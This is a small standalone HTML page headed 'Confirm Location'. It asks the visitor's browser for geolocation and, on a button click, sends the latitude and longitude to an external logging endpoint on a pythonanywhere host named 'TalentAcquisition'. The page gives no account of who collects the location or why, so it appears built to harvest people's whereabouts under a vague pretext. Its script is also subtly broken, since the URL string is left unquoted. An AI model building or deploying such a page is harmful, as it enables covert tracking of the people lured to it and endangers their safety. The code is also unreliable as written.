<!DOCTYPE html>
<html>
<head>
    <title>Confirm Location</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body {
            font-family: sans-serif;
            display:flex;
            justify-content:center;
            align-items:center;
            height:100vh;
            margin:0;
            background:#f4f4f4;
        }

        .card {
            background:white;
            padding:25px;
            border-radius:12px;
            width:90%;
            max-width:400px;
            text-align:center;
        }

        button {
            width:100%;
            padding:12px;
            margin-top:10px;
            border:none;
            border-radius:8px;
            font-size:16px;
            cursor:pointer;
        }

        .btn { background:#007bff; color:white; }
        .confirm { background:#28a745; color:white; }

        #status {
            margin-top:10px;
            color:gray;
            font-size:14px;
        }
    </style>
</head>
<body>

<div class="card">

    <h3>📍 Confirm Location</h3>

    <button class="btn" onclick="getLocation()">Get Location</button>

    <p id="status"></p>

    <button class="confirm" onclick="sendLocation()">Confirm & Send</button>

</div>

<script>

let lat = null;
let lon = null;

function getLocation() {

    document.getElementById("status").innerText = "Getting location...";

    navigator.geolocation.getCurrentPosition(
        (pos) => {
            lat = pos.coords.latitude;
            lon = pos.coords.longitude;

            document.getElementById("status").innerText =
                "Location ready ✔ Click Confirm";
        },
        () => {
            document.getElementById("status").innerText =
                "Permission denied ❌";
        }
    );
}

function sendLocation() {

    if (!lat || !lon) {
        alert("Get location first");
        return;
    }

    let url = https://TalentAcquisition.pythonanywhere.com/log
        + "?lat=" + lat
        + "&lon=" + lon
        + "&ip=web"
        + "&type=confirmed";

    console.log("Sending to:", url);

    fetch(url)
    .then(response => response.text())
    .then(data => {
        console.log("SUCCESS:", data);
        document.getElementById("status").innerText = "Saved ✔";
    })
    .catch(error => {
        console.log("ERROR:", error);
        document.getElementById("status").innerText = "Failed to send ❌";
    });
}
</script>

</body>
</html>
